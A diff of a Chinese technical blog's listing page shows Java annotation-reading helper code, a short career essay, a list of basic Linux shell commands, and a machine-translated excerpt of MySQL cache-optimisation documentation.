获取Document注解中的值</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static String getDocRefreshInterval(Class clazz)&#123;</span><br><span class="line">        Document document = (Document) clazz.getAnnotation(Document.class);</span><br><span class="line">        return document.refreshInterval();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取Document注解中的值</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static String getDocIndexStoreType(Class clazz)&#123;</span><br><span class="line">        Document document = (Document) clazz.getAnnotation(Document.class);</span><br><span class="line">        return document.indexStoreType();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取DocId被注解字段</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static String getDocId(Class clazz) throws NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">        List&lt;Field&gt; result = new ArrayList&lt;Field&gt;();</span><br><span class="line">        for (Field field:fields)&#123;</span><br><span class="line">            if(field.getAnnotation(DocId.class)!=null)&#123;</span><br><span class="line">                result.add(field);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(result.size()!=1)&#123;</span><br><span class="line">            throw new NoSuchFieldException(&quot;未找到注解&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return result.get(0).getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取DocType被注解字段</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static String getDocType(Class clazz) throws NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">        List&lt;Field&gt; result = new ArrayList&lt;Field&gt;();</span><br><span class="line">        for (Field field:fields)&#123;</span><br><span class="line">            if(field.getAnnotation(DocType.class)!=null)&#123;</span><br><span class="line">                result.add(field);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(result.size()!=1)&#123;</span><br><span class="line">            throw new NoSuchFieldException(&quot;未找到注解&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return result.get(0).getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取DocSearchKeyWord被注解字段</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static List&lt;String&gt; getDocKeyword(Class clazz) throws NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">        List&lt;String&gt; list = new ArrayList&lt;&gt;();</span><br><span class="line">        for (Field field:fields)&#123;</span><br><span class="line">            if(field.getAnnotation(DocSearchKeyWord.class)!=null)&#123;</span><br><span class="line">                list.add(field.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(list.size() ==0)&#123;</span><br><span class="line">            throw new NoSuchFieldException(&quot;未找到注解&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return list;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+            <p>本着对技术的兴趣 进入了软件开发行业</p>
+<p>可以说是如鱼得水的发展 凭借着年轻 挑灯夜战 掌握了许多技术应用、但仍脱不开技术应用者的领域</p>
+<p>如今职业发展遇到瓶颈-该思考何去何从</p>
+<p>想来想去只有选择架构师为发展方向</p>
+<p><strong>怎样成为一个架构师？</strong><br>{———-}<br><strong>首先什么是架构师？</strong></p>
+<p>随着互联网应用的快速发展、各个领域相继进入互联网、各种业务形式的应用、一个合理的架构应对服务流量冲击显得尤为重要</p>
+<p>那么应用架构针对应用更好的优化、分解、先有soa、后有微服务概念、<br>对于这个整体的请求走势要做到心中有数、到细节中每个请求的所经过的服务器心里有谱、对服务器承载能力有着清晰的认识</p>
+<p>脑海里要有一个三维网络图</p>
+<p>同时能细节看到某个节点内部的工作方式、又能从宏观角度看的到请求流转、敏锐感知节点中的压力点</p>
+<p>然后针对业务领域、每个请求的频率、有一个经验教训、才能更好的使用脑海中的技术架构去整合起来业务压力</p>
+<p>外包待出的毛病，除了用，啥都不会</p>
+
           
         
       
@@ -1394,35 +1218,35 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/jdk/jdk-map/" rel="bookmark">集合Map</a></div>
+      <div class="popular-posts-title"><a href="/2018/06/30/essay/weichat-h5-pay/" rel="bookmark">微信H5支付</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2019/05/26/jdk/jdk-model/" rel="bookmark">jdk内存模型</a></div>
+      <div class="popular-posts-title"><a href="/2019/01/12/essay/essay-20/" rel="bookmark">遐想--定制应用</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/12/11/jdk/jdk-nio/" rel="bookmark">Java NIO浅析【转】</a></div>
+      <div class="popular-posts-title"><a href="/2018/12/12/essay/essay-18/" rel="bookmark">编程的套路</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/11/01/jdk/jdk-tree/" rel="bookmark">java 红黑树</a></div>
+      <div class="popular-posts-title"><a href="/2018/11/10/essay/avro/" rel="bookmark">apache avro 序列化</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/jdk/jdk-list/" rel="bookmark">列表List</a></div>
+      <div class="popular-posts-title"><a href="/2018/10/24/essay/essay-16/" rel="bookmark">本博客成长笔记</a></div>
       
     </li>
   
@@ -1479,7 +1303,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/jdk/jdk-list/">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/shell/shell-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="上善若水">
@@ -1499,7 +1323,207 @@
           <h2 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2018/03/24/jdk/jdk-list/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/18/index.html">列表List</a>
+                <a href="/2018/03/24/shell/shell-1/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/18/index.html">java后台常用命令</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/shell/" itemprop="url" rel="index"><span itemprop="name">shell</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">cd</span><br><span class="line"></span><br><span class="line">ps</span><br><span class="line"></span><br><span class="line">ps -ef</span><br><span class="line"></span><br><span class="line">ps -ef | grep &quot;&quot;</span><br><span class="line"></span><br><span class="line">| 管道符</span><br><span class="line">#移动文件</span><br><span class="line">mv  /usr/bin/mysql.db /var/data/mysql/mysql-2017-09-09.db</span><br><span class="line"></span><br><span class="line">#复制文件</span><br><span class="line">cp  /usr/bin/mysql.db /var/data/mysql/mysql-2017-09-09.db.backup</span><br><span class="line">#复制文件夹</span><br><span class="line">cp -a /usr/bin/  /var/data/mysql/</span><br><span class="line"></span><br><span class="line"> mkdir New_Dir</span><br><span class="line"> mkdir -p New_Dir/Sub_Dir/Under_Dir </span><br><span class="line"></span><br><span class="line">sh .../*.sh</span><br><span class="line"></span><br><span class="line">vim 123.txt</span><br><span class="line"></span><br><span class="line">tail -f ../*.log </span><br><span class="line">tail -f -n1000 ../*.log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#压缩</span><br><span class="line">tar -zcvf test.tar.gz ./test/</span><br><span class="line">#解压</span><br><span class="line">tar xzvf test.tar.gz</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    
+      
+
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2019/05/15/shell/shell-7/" rel="bookmark">linux 排查命令</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2019/04/15/shell/shell-6/" rel="bookmark">node--npm    命令</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/11/15/shell/shell-5/" rel="bookmark">linux 删除命令 rm 改为 mv</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/05/30/shell/shell-4/" rel="bookmark">linux 监控服务脚本</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/05/30/shell/shell-3/" rel="bookmark">linux 清空缓存</a></div>
+      
+    </li>
+  
+  </ul>
+
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/mysql/optimization-sql-cached/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="上善若水">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水の技术簿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2018/03/24/mysql/optimization-sql-cached/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/18/index.html">SQL优化【缓存优化】</a>
               
             
           </h2>
@@ -1549,7 +1573,7 @@
                   ，
                 
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/jdk/" itemprop="url" rel="index"><span itemprop="name">jdk</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/mysql/" itemprop="url" rel="index"><span itemprop="name">mysql</span></a></span>
 
                 
                 
@@ -1585,35 +1609,247 @@
       
         
           
-            <p>jdk8 ：<br><img src="https://upload-images.jianshu.io/upload_images/6434888-355af25aed2af567.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="集合.jpg"></p>
-<p>ArrayList 初始容量10 其次16<br>jdk8中 在add数据时候进行初始化</p>
-<p>vector arraylist都是 object[]<br>也就是数组</p>
-<p>linkedlist 是 node first ；node last<br>也就是链表</p>
-<p>另外arraylist中包含sort方法 是可排序的</p>
-<p>vector扩展 是double 倍数扩展</p>
+            <p><img src="https://upload-images.jianshu.io/upload_images/6434888-d3a8321d9c17a82b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>8.10.1 InnoDB缓冲池优化<br>8.10.2 MyISAM密钥缓存<br>8.10.3 MySQL查询缓存<br>8.10.4准备好的语句和存储程序的缓存<br>MySQL使用几种策略来缓存内存缓冲区中的信息以提高性能。</p>
+<p>8.10.1 InnoDB缓冲池优化<br>InnoDB维护一个称为缓冲池的存储区域， 用于缓存内存中的数据和索引。知道InnoDB缓冲池如何 工作，并利用它来将频繁访问的数据保存在内存中，是MySQL调优的一个重要方面。</p>
+<p>有关InnoDB缓冲池内部工作原理的说明， LRU替换算法的概述以及常规配置信息，请参见第14.6.3.1节“InnoDB缓冲池”。</p>
+<p>有关其他InnoDB缓冲池配置和调整信息，请参阅以下部分：</p>
+<p>第14.6.3.5节“配置InnoDB缓冲池预取（预读）”</p>
+<p>第14.6.3.6节“配置InnoDB缓冲池刷新”</p>
+<p>第14.6.3.4节“使缓冲池扫描抗性”</p>
+<p>第14.6.3.3节“配置多个缓冲池实例”</p>
+<p>第14.6.3.8节“保存和恢复缓冲池状态”</p>
+<p>第14.6.3.7节“微调InnoDB缓冲池刷新”</p>
+<p>第14.6.3.2节“配置InnoDB缓冲池大小”</p>
 <p>{———-}</p>
-<pre><code>关于数据结构想到这么一种描述方式： 种菜的园子
-1、【数组】数据结构、茄子、土豆、冬瓜、南瓜 对应【int string boolean double ..】
-我们规划一个园子、自然要分成一块块去种植不同的蔬菜【存放不同的数据】
-**提取数据分类方式【数组】**
-2、种菜不可避免的规则、一个萝卜一个坑、坑的位置就是数组的坐标、
-    左边第一排 从上往下数第二个、这个就是坐标、你姥姥让你去摘个茄子、总会让你告诉你摘哪一个、
-    有人会说了、他会让我采摘根据大小去采摘、那么成了数据的排序了
+<p>8.10.2 MyISAM密钥缓存<br>8.10.2.1共享密钥缓存访问<br>8.10.2.2多个密钥缓存<br>8.10.2.3中点插入策略<br>8.10.2.4索引预加载<br>8.10.2.5密钥缓存块大小<br>8.10.2.6重构密钥缓存<br>为了最小化磁盘I / O，MyISAM存储引擎利用许多数据库管理系统使用的策略。它采用缓存机制将最常访问的表块保存在内存中：</p>
+<p>对于索引块，维护称为密钥缓存（或 密钥缓冲区）的特殊结构 。该结构包含许多块缓冲区，其中放置了最常用的索引块。</p>
+<p>对于数据块，MySQL不使用特殊缓存。相反，它依赖于本机操作系统文件系统缓存。</p>
+<p>本节首先介绍MyISAM密钥缓存的基本操作 。然后讨论了可以提高密钥缓存性能并使您能够更好地控制缓存操作的功能：</p>
+<p>多个会话可以同时访问缓存。</p>
+<p>您可以设置多个密​​钥缓存并将表索引分配给特定缓存。</p>
+<p>要控制密钥缓存的大小，请使用 key_buffer_size系统变量。如果将此变量设置为零，则不使用密钥缓存。如果key_buffer_size值太小而无法分配最小数量的块缓冲区，则不使用密钥缓存 （8）。</p>
+<p>当密钥缓存不可操作时，仅使用操作系统提供的本机文件系统缓冲来访问索引文件。（换句话说，使用与表数据块相同的策略访问表索引块。）</p>
+<p>索引块是对MyISAM索引文件的连续访问单元 。通常，索引块的大小等于索引B树的节点大小。（索引在磁盘上使用B树数据结构表示。树底部的节点是叶节点。叶节点上方的节点是非叶节点。）</p>
+<p>密钥缓存结构中的所有块缓冲区大小相同。该大小可以等于，大于或小于表索引块的大小。通常这两个值中的一个是另一个的倍数。</p>
+<p>当必须访问来自任何表索引块的数据时，服务器首先检查它是否在密钥缓存的某个块缓冲区中可用。如果是，则服务器访问密钥缓存中的数据而不是磁盘上的数据。也就是说，它从缓存读取或写入其中而不是读取或写入磁盘。否则，服务器选择包含不同表索引块（或块）的高速缓存块缓冲区，并用必需的表索引块的副本替换那里的数据。只要新索引块位于缓存中，就可以访问索引数据。</p>
+<p>如果发生了选择替换的块已被修改，则该块被认为是“ 脏的。“在这种情况下，在被替换之前，其内容被刷新到它所来自的表索引。</p>
+<p>通常服务器遵循LRU（最近最少使用）策略：当选择要替换的块时，它选择最近最少使用的索引块。为了使这个选择更容易，密钥缓存模块将所有使用的块维护在按使用时间排序的特殊列表（LRU链）中。访问块时，它是最近使用的块，位于列表的末尾。当需要替换块时，列表开头的块是最近最少使用的块，并成为第一个驱逐的候选块。</p>
+<p>该InnoDB存储引擎还采用LRU算法来管理它的缓冲池。请参见 第14.6.3.1节“InnoDB缓冲池”。</p>
+<p>8.10.2.1共享密钥缓存访问<br>线程可以同时访问密钥缓存缓冲区，但要符合以下条件：</p>
+<p>多个会话可以访问未更新的缓冲区。</p>
+<p>正在更新的缓冲区会导致需要使用它的会话等待更新完成。</p>
+<p>多个会话可以发起导致高速缓存块替换的请求，只要它们不相互干扰（即，只要它们需要不同的索引块，从而导致不同的高速缓存块被替换）。</p>
+<p>对密钥缓存的共享访问使服务器能够显着提高吞吐量。</p>
+<p>8.10.2.2多个密钥缓存<br>对密钥缓存的共享访问可提高性能，但不会完全消除会话之间的争用。他们仍在竞争管理对密钥缓存缓冲区的访问的控制结构。为了进一步减少密钥缓存访问争用，MySQL还提供了多个密钥缓存。此功能使您可以将不同的表索引分配给不同的密钥缓存。</p>
+<p>在存在多个密钥缓存的情况下，服务器必须知道在处理给定MyISAM表的查询时要使用哪个缓存 。默认情况下，所有 MyISAM表索引都缓存在默认密钥缓存中。要将表索引分配给特定的键缓存，请使用该CACHE INDEX 语句（请参见第13.7.6.2节“CACHE INDEX语法”）。例如，下面的语句从表中分配指标 t1，t2以及 t3名为键缓存 hot_cache：</p>
+<p>MySQL的&gt; CACHE INDEX t1, t2, t3 IN hot_cache;</p>
+<ul>
+<li>——— + ——————– + ———- + ——- — +<br>| 表| Op | Msg_type | Msg_text |</li>
+<li>——— + ——————– + ———- + ——- — +<br>| test.t1 | assign_to_keycache | 状态| 好的<br>| test.t2 | assign_to_keycache | 状态| 好的<br>| test.t3 | assign_to_keycache | 状态| 好的</li>
+<li>——— + ——————– + ———- + ——- — +<br>CACHE INDEX可以SET GLOBAL通过使用参数设置语句或使用服务器启动选项设置其大小来创建语句中 引用的键高速缓存。例如：</li>
+</ul>
+<p>MySQL的&gt; SET GLOBAL keycache1.key_buffer_size=128*1024;<br>要销毁密钥缓存，请将其大小设置为零：</p>
+<p>MySQL的&gt; SET GLOBAL keycache1.key_buffer_size=0;<br>您无法销毁默认密钥缓存。任何尝试这样做都会被忽略：</p>
+<p>MySQL的&gt; SET GLOBAL key_buffer_size = 0;</p>
+<p>MySQL的&gt; SHOW VARIABLES LIKE ‘key_buffer_size’;</p>
+<ul>
+<li>—————– + ——— +<br>| Variable_name | 值|</li>
+<li>—————– + ——— +<br>| key_buffer_size | 8384512 |</li>
+<li>—————– + ——— +<br>密钥缓存变量是具有名称和组件的结构化系统变量。For keycache1.key_buffer_size， keycache1是缓存变量名称， key_buffer_size是缓存组件。有关用于引用结构化密钥缓存系统变量的语法的说明，请参见第5.1.8.1节“结构化系统变量”。</li>
+</ul>
+<p>默认情况下，表索引分配给在服务器启动时创建的主（默认）密钥缓存。销毁密钥缓存时，分配给它的所有索引都将重新分配给默认密钥缓存。</p>
+<p>对于繁忙的服务器，您可以使用涉及三个密钥缓存的策略：</p>
+<p>一个“ 热 ”键高速占用分配给所有键高速缓冲空间的20％。对于大量用于搜索但未更新的表使用此选项。</p>
+<p>一个“ 冷 ”键高速占用分配给所有键高速缓冲空间的20％。将此缓存用于中型，密集修改的表，例如临时表。</p>
+<p>一个“ 温暖 ”键高速占用键高速缓冲空间的60％。将此作为默认密钥缓存，默认情况下用于所有其他表。</p>
+<p>使用三个密钥高速缓存有益的一个原因是对一个密钥高速缓存结构的访问不会阻止对其他密钥高速缓存的访问。访问分配给一个缓存的表的语句不会与访问分配给另一个缓存的表的语句竞争。性能提升也出于其他原因：</p>
+<p>热缓存仅用于检索查询，因此永远不会修改其内容。因此，每当需要从磁盘引入索引块时，不需要首先刷新选择用于替换的高速缓存块的内容。</p>
+<p>对于分配给热缓存的索引，如果不存在需要索引扫描的查询，则对应于索引B树的非叶节点的索引块很可能保留在缓存中。</p>
+<p>当更新的节点在高速缓存中并且不需要首先从磁盘读入时，对于临时表最频繁执行的更新操作执行得更快。如果临时表的索引的大小与冷键高速缓存的大小相当，则更新的节点在高速缓存中的概率非常高。</p>
+<p>该CACHE INDEX语句在表和密钥缓存之间建立关联，但每次服务器重新启动时关联都会丢失。如果希望关联在每次服务器启动时生效，则实现此目的的一种方法是使用选项文件：包括配置密钥缓存的变量设置，以及init-file命名包含CACHE INDEX 要执行的语句的文件的 选项。例如：</p>
+<p>key_buffer_size = 4G<br>hot_cache.key_buffer_size = 2G<br>cold_cache.key_buffer_size = 2G<br>init_file = / path/ to/ data-directorymysqld_init.sql<br>mysqld_init.sql每次服务器启动时都会执行 语句。该文件每行应包含一个SQL语句。以下示例分别为hot_cache和 分配了几个表cold_cache：</p>
+<p>CACHE INDEX db1.t1，db1.t2，db2.t3在hot_cache中<br>CACHE INDEX db1.t4，db2.t5，db2.t6在cold_cache中<br>8.10.2.3中点插入策略<br>默认情况下，密钥缓存管理系统使用简单的LRU策略来选择要逐出的密钥缓存块，但它还支持称为中点插入策略的更复杂的方法 。</p>
+<p>使用中点插入策略时，LRU链分为两部分：热子列表和热子列表。两部分之间的分割点并不固定，但是密钥缓存管理系统注意到热部分不是 “ 太短 ”，总是包含至少 key_cache_division_limit 百分比的密钥缓存块。 key_cache_division_limit是结构化键缓存变量的组件，因此其值是可以为每个缓存设置的参数。</p>
+<p>当索引块从表中读入密钥缓存时，它将放在暖子列表的末尾。在一定数量的命中（访问块）之后，它被提升到热子列表。目前，促进块（3）所需的命中数对于所有索引块是相同的。</p>
+<p>升级到热子列表的块放在列表的末尾。然后该块在该子列表中循环。如果块在子列表的开头停留足够长的时间，则将其降级为暖子列表。此时间由key_cache_age_threshold 密钥缓存的组件的值确定 。</p>
+<p>阈值规定，对于包含N块的密钥缓存，在最后一次N * key_cache_age_threshold / 100命中内未访问的热子列表开头的块 将被移动到暖子列表的开头。然后它成为第一个被驱逐的候选者，因为替换的块总是从暖子列表的开头获取。</p>
+<p>中点插入策略使您可以将更多值的块始终保留在缓存中。如果您更喜欢使用普通LRU策略，请将 key_cache_division_limit 值设置为默认值100。</p>
+<p>当执行需要索引扫描的查询有效地从缓存中推出对应于有价值的高级B树节点的所有索引块时，中点插入策略有助于提高性能。为避免这种情况，您必须使用key_cache_division_limit设置为远小于100 的中点插入策略 。然后，在索引扫描操作期间，有价值的频繁命中节点也会保留在热子列表中。</p>
+<p>8.10.2.4索引预加载<br>如果密钥缓存中有足够的块来保存整个索引的块，或者至少是与其非叶节点对应的块，则在开始使用之前使用索引块预加载密钥缓存是有意义的。预加载使您能够以最有效的方式将表索引块放入密钥缓存缓冲区：通过顺序从磁盘读取索引块。</p>
+<p>在没有预加载的情况下，块仍然根据查询的需要放入密钥缓存中。虽然这些块将保留在缓存中，因为所有缓冲区都有足够的缓冲区，它们是以随机顺序从磁盘中提取的，而不是按顺序提取的。</p>
+<p>要将索引预加载到缓存中，请使用该 LOAD INDEX INTO CACHE语句。例如，以下语句预加载表的索引的节点（索引块），t1并且t2：</p>
+<p>MySQL的&gt; LOAD INDEX INTO CACHE t1, t2 IGNORE LEAVES;</p>
+<ul>
+<li>——— + ————– + ———- + ———- +<br>| 表| Op | Msg_type | Msg_text |</li>
+<li>——— + ————– + ———- + ———- +<br>| test.t1 | preload_keys | 状态| 好的<br>| test.t2 | preload_keys | 状态| 好的</li>
+<li>——— + ————– + ———- + ———- +<br>所述IGNORE LEAVES改性剂导致要预装只为索引的非叶结点的块。因此，显示的语句预加载所有索引块t1，但仅从非叶节点预加载 t2。</li>
+</ul>
+<p>如果已使用CACHE INDEX语句将索引分配给键高速缓存 ，则预加载会将索引块放入该高速缓存中。否则，索引将加载到默认密钥缓存中。</p>
+<p>8.10.2.5密钥缓存块大小<br>可以使用key_cache_block_size 变量为单个密钥缓存指定块缓冲区的大小 。这允许调整索引文件的I / O操作的性能。</p>
+<p>当读取缓冲区的大小等于本机操作系统I / O缓冲区的大小时，可以实现I / O操作的最佳性能。但是，将关键节点的大小设置为等于I / O缓冲区的大小并不总能确保最佳的整体性能。在读取大叶子节点时，服务器会吸入大量不必要的数据，有效地阻止了读取其他叶子节点。</p>
+<p>要控制表的.MYI 索引文件中块的大小MyISAM，请使用–myisam-block-size服务器启动时的 选项。</p>
+<p>8.10.2.6重构密钥缓存<br>可以通过更新其参数值随时重新构建密钥缓存。例如：</p>
+<p>MySQL的&gt; SET GLOBAL cold_cache.key_buffer_size=4<em>1024</em>1024;<br>如果为key_buffer_size或 key_cache_block_size缓存组件分配 的值与组件的当前值不同，则服务器会销毁缓存的旧结构并根据新值创建新结构。如果缓存包含任何脏块，则服务器会在销毁和重新创建缓存之前将它们保存到磁盘。如果更改其他键缓存参数，则不会进行重组。</p>
+<p>重构密钥缓存时，服务器首先将任何脏缓冲区的内容刷新到磁盘。之后，缓存内容变得不可用。但是，重组不会阻止需要使用分配给缓存的索引的查询。相反，服务器使用本机文件系统缓存直接访问表索引。文件系统缓存不如使用密钥缓存有效，因此尽管执行查询，但可以预期减速。重新构建缓存后，它将再次可用于缓存分配给它的索引，并且对索引的文件系统缓存的使用将停止。</p>
+<p>8.10.3 MySQL查询缓存<br>8.10.3.1查询缓存的运行方式<br>8.10.3.2查询缓存SELECT选项<br>8.10.3.3查询缓存配置<br>8.10.3.4查询缓存状态和维护<br>注意<br>从MySQL 5.7.20开始，不推荐使用查询缓存，并在MySQL 8.0中删除。</p>
+<p>查询缓存存储SELECT语句的文本以及 发送到客户端的相应结果。如果稍后收到相同的语句，则服务器从查询缓存中检索结果，而不是再次解析和执行语句。查询缓存在会话之间共享，因此可以发送由一个客户端生成的结果集以响应由另一个客户端发出的相同查询。</p>
+<p>查询缓存在您拥有不经常更改且服务器接收许多相同查询的表的环境中非常有用。这是许多基于数据库内容生成许多动态页面的Web服务器的典型情况。</p>
+<p>查询缓存不返回过时数据。修改表时，将刷新查询缓存中的所有相关条目。</p>
+<p>注意<br>查询缓存在多个mysqld服务器更新相同 MyISAM表的环境中不起作用。</p>
+<p>查询高速缓存用于第8.10.3.1节“查询高速缓存如何操作”中描述的条件下的预准备语句。</p>
+<p>注意<br>分区表不支持查询缓存，并且对涉及分区表的查询自动禁用查询缓存。无法为此类查询启用查询缓存。</p>
+<p>下面是查询缓存的一些性能数据。这些结果是通过在具有2GB RAM和64MB查询缓存的Linux Alpha 2×500MHz系统上运行MySQL基准测试套件生成的。</p>
+<p>如果您执行的所有查询都很简单（例如从具有一行的表中选择一行），但仍然不同以便无法缓存查询，则使查询缓存处于活动状态的开销为13％。这可能被认为是最糟糕的情况。在现实生活中，查询往往要复杂得多，因此开销通常会显着降低。</p>
+<p>在单行表中搜索单行的查询缓存比没有查询缓存快238％。这可以被视为接近缓存的查询所期望的最小加速。</p>
+<p>要在服务器启动时禁用查询缓存，请将query_cache_size系统变量设置 为0.通过禁用查询缓存代码，没有明显的开销。</p>
+<p>查询缓存提供了实质性性能改进的潜力，但不要假设它将在所有情况下都这样做。使用某些查询缓存配置或服务器工作负载，您实际上可能会看到性能下降：</p>
+<p>请谨慎调整查询缓存的大小，这会增加维护缓存所需的开销，可能超出启用缓存的优势。数十兆字节的大小通常是有益的。数百兆字节的大小可能不是。</p>
+<p>服务器工作负载对查询缓存效率有显着影响。几乎完全由一组固定SELECT 语句组成的查询混合更有可能从启用缓存中获益，而不是频繁INSERT语句导致缓存中结果连续失效的混合 。在某些情况下，解决方法是使用该 SQL_NO_CACHE选项来防止结果甚至为SELECT使用频繁修改的表的语句进入缓存 。（请参见 第8.10.3.2节“查询缓存SELECT选项”。）</p>
+<p>要验证启用查询缓存是否有益，请在启用和禁用缓存的情况下测试MySQL服务器的操作。然后定期重新测试，因为查询缓存效率可能会随着服</p>
+<p>8.10.3.1查询缓存的运行方式<br>注意<br>从MySQL 5.7.20开始，不推荐使用查询缓存，并在MySQL 8.0中删除。</p>
+<p>本节介绍查询缓存在运行时的工作方式。第8.10.3.3节“查询缓存配置”描述了如何控制它是否可操作。</p>
+<p>在解析之前，将传入的查询与查询缓存中的查询进行比较，因此查询缓存将以下两个查询视为不同：</p>
+<p>SELECT <em> FROM tbl_name<br>选择</em>来自tbl_name<br>查询必须完全相同（字节为字节）才能看作相同。另外，由于其他原因，可以将相同的查询字符串视为不同。使用不同数据库，不同协议版本或不同默认字符集的查询被视为不同的查询，并单独缓存。</p>
+<p>缓存不用于以下类型的查询：</p>
+<p>查询是外部查询的子查询</p>
+<p>在存储的函数，触发器或事件的主体内执行的查询</p>
+<p>在从查询缓存中获取查询结果之前，MySQL会检查用户是否拥有所 SELECT涉及的所有数据库和表的权限。如果不是这种情况，则不使用缓存的结果。</p>
